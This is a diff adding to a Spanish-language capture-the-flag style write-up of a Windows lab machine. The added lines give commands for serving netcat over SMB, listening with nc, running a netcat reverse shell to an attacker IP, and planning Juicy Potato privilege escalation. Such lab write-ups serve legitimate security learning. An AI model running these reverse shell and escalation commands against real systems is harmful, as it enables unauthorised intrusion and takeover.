@@ -61,6 +61,32 @@ Al acceder a el nos permite realizar ejecución de comandos
 
 También se nos genera un archivo llamado `session.json` que nos permite añadir una nueva cookie de sesión en la web y poder obtener acceso como el usuario administrador a l maquina.
 
-Ahora vamos a entablar una conexión con nuestra maquina realizando una *Reverse Shell* a nuestra maquina
+Ahora vamos a entablar una conexión con nuestra maquina realizando una *Reverse Shell* a nuestra maquina.
+Primero deberemos de levantarnos un servidor con [[SMBSERVER]] y compartirnos un [[NETCAT]] con la maquina victima
+```shell
+smbserver.py smbFolder $(pwd)
+```
+
+A continuación deberemos de ponernos en escucha
+```shell
+rlwrap nc -nlvp 443
+```
+
+Y deberemos de ejecutar la *Reverse Shell* en la web
+```shell
+\\10.10.14.226\smbFolder\nc.exe -e cmd 10.10.14.226 443
+```
+
+Obteniendo así una shell en la maquina victima, en el escritorio del usuario *Dimitirs* encontraremos la primera flag del user.
+
+Ahora escalaremos privilegios, enumeraremos los privilegios de mi usuario
+```shell
+whoami /priv
+```
+
+Observamos que tenemos `SeImpersonatePrivilege` usaremos la herramienta de [[JUICY-POTATO]]
+Nos la compartiremos a través de un servidor *SMB* con [[SMBSERVER]]
+
+
 
 
